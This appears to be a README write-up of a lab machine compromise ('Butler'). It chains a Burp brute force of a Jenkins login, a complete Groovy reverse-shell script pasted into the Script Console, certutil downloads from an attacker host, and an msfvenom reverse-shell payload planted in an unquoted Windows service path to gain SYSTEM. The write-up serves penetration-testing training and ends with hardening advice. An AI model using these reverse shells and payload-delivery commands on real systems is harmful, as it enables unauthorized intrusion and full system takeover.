# Butler – Jenkins Exploitation & Windows Privilege Escalation

This repository documents the compromise of the **Butler machine**, demonstrating a full attack chain from **initial service enumeration**, **Jenkins authentication bypass via brute force**, **remote shell access using the Jenkins script console**, and **privilege escalation through an Unquoted Service Path vulnerability**.

The goal of this lab was to demonstrate practical offensive security techniques used during **real-world penetration tests**, including enumeration, credential attacks, reverse shell exploitation, and Windows privilege escalation.

---

# Initial Enumeration

The first step was to scan the target machine to identify open ports and services.

```
nmap -T4 -p- -A [ip address/domain name]
```

### Nmap Results

```
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-server-header: Jetty(9.4.41.v20210516)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

The scan revealed that **port 8080** was running **Jetty**, which commonly hosts **Jenkins web applications**.

Since **port 80 was not open**, the next step was to access the web service directly on port **8080**.

* screenshots/01-jenkins-welcome-page.pang

---

# Jenkins Login Page Discovery

The web interface revealed a **Jenkins login portal**.

Because Jenkins administrative panels often lead to **remote command execution capabilities**, gaining authenticated access became the primary objective.

To achieve this, **Burp Suite** was used to intercept and manipulate login requests.

---

# Intercepting Login Traffic

First, **FoxyProxy** was enabled to route browser traffic through **Burp Suite**.

Then a login attempt was made using random credentials to capture the request.

* screenshots/02-foxyproxy.png
* screenshots/03-attempt-login-jenkins.png
* screenshots/04-intercept-jenkins-login-traffic-on-burpsuite.png

The intercepted request was then forwarded for further testing.

---

# Sending Request to Repeater and Intruder

The request was forwarded to **Burp Repeater** and then to **Intruder** to perform credential attacks.

* screenshots/05-forward-intercepted-trafic-to-repeater.png

---

# Brute Force Attack with Burp Intruder

Since no known credentials were available, a **brute force attack** was performed.

Steps taken:

1. Cleared all automatic selections
2. Selected username and password parameters
3. Added them as attack positions
4. Configured payload lists

The attack method used was:

**Cluster Bomb Attack**

Cluster Bomb is appropriate when **both username and password are unknown**.

* screenshots/06b-capture-username-placeholder-for-bruteforcing.png

After configuration, the attack was launched.

* screenshots/07-bruteforce-attack-process.png

---

# Credential Discovery

During the brute-force process, one response displayed a **subtle change in packet length**, indicating a successful login attempt.

Credentials discovered:

```
Username: jenkins
Password: jenkins
```

* screenshots/08-login-with-credentials-from-bruteforce-attack.png

Testing these credentials on the login page resulted in successful authentication.

* screenshots/09-login-success.png

---

# Post Authentication Enumeration

After logging into Jenkins, the administrative dashboard became accessible.

Further enumeration of the interface revealed potentially exploitable features.

* screenshots/10-found-exploitable-feature-in-manage-panel.png

Under the **Manage Jenkins panel**, two important features were discovered:

* Jenkins CLI
* Script Console

- screenshots/11-script-console-interface-site-feature-to-abuse.png

The **Script Console** allows execution of **Groovy scripts**, which can be abused to execute system commands.

---

# Exploiting Jenkins Script Console

Searching for **Jenkins Script Console exploits** revealed a **Groovy reverse shell**.

The following reverse shell script was used.

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();
po.flush();
Thread.sleep(50);
try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

Before executing the script:

* **localhost** was replaced with the **attacker machine IP**
* A listener was started on port **8044**

- screenshots/12-reverseshellscript-pasted-to-groovy.png
- screenshots/13-lister-opened-on-attacker-machine.png

After running the script, a **reverse shell connection** was established.

* screenshots/14-reverseshell-initiated-shell-gained.png

Access was obtained as a **low-privileged user**.

---

# Privilege Escalation Enumeration

To escalate privileges, **WinPEAS** was used to scan the system for potential vulnerabilities.

First, the WinPEAS binary was hosted on the attacker machine.

* screenshots/15-winpease-folder-served-up.png

Then it was downloaded on the target machine using **certutil**.

```
certutil -urlcache -f http://<attacker ip>/winpeas.exe winpeas.exe
```

* screenshots/16-winpeas-upload-success.png

After downloading, the tool was executed.

```
winpeas.exe
```

---

# WinPEAS Findings

The scan identified several potential privilege escalation vectors.

One particularly important discovery was an **Unquoted Service Path vulnerability**.

```
WiseBootAssistant
```

* screenshots/17-winpeas-find-services-with-unquoted-path.png

---

# Understanding Unquoted Service Path

An **Unquoted Service Path vulnerability** occurs when a Windows service path contains spaces but is not wrapped in quotation marks.

Example path:

```
C:\Program Files (x86)\Wise\WiseCare365\BootTime.exe
```

When executed without quotes, Windows attempts to run executables in sequence:

```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Wise\Wise.exe
...
```

If an attacker places a malicious executable in one of these locations, Windows may execute it with **SYSTEM privileges**.

The service configuration was verified through the Windows registry.

* screenshots/18-service-with-unquoted-path-1.png
* screenshots/19-service-with-unquoted-path-2.png

---

# Creating a Malicious Payload

A reverse shell payload was generated using **msfvenom**.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.44.68 LPORT=7777 -f exe -o Wise.exe
```

The payload was hosted using a Python web server.

```
python3 -m http.server 81
```

* screenshots/20-create-payload-and-serveup-directory.png

System information was also gathered to confirm compatibility.

* screenshots/21-systeminfo-victim-machine.png

---

# Uploading the Payload

Next, the target directory associated with the vulnerable service was accessed.

* screenshots/22-navigate-to-unquoted-path.png

The payload was then uploaded.

```
certutil -urlcache -f http://192.168.44.68/Wise.exe Wise.exe
```

* screenshots/23-upload-payload.png

---

# Preparing Reverse Shell Listener

A Netcat listener was started on the attacker machine.

```
nc -nlvp 7777
```

* screenshots/24-nc-listening.png

---

# Triggering the Exploit

First, the vulnerable service was stopped.

```
sc stop WiseBootAssistant
```

Verification:

```
sc query WiseBootAssistant
```

* screenshots/25-stop-service-with-unquoted-path.png

The service was then restarted.

```
sc start WiseBootAssistant
```

When restarted, Windows attempted to execute the malicious **Wise.exe**, which triggered the reverse shell.

---

# SYSTEM Access Achieved

The payload executed with **SYSTEM privileges**, granting full administrative access.

* screenshots/26-authority-shell-gained.png

---

# Key Skills Demonstrated

This lab demonstrates several important penetration testing techniques:

* Brute force authentication attacks using **Burp Suite**
* Jenkins exploitation via **Script Console**
* Reverse shell deployment using **Groovy scripts**
* Windows privilege escalation with **Unquoted Service Paths**
* Payload generation using **msfvenom**
* Vulnerability enumeration using **WinPEAS**
* Reverse shell handling using **Netcat**

---

# Conclusion

This lab highlights how **multiple small weaknesses** — weak credentials, exposed administrative interfaces, and insecure service configurations — can be chained together to achieve **complete system compromise**.

It demonstrates the importance of:

* Strong authentication policies
* Restricting administrative interfaces
* Proper service path configuration
* Regular system hardening and patching.

---
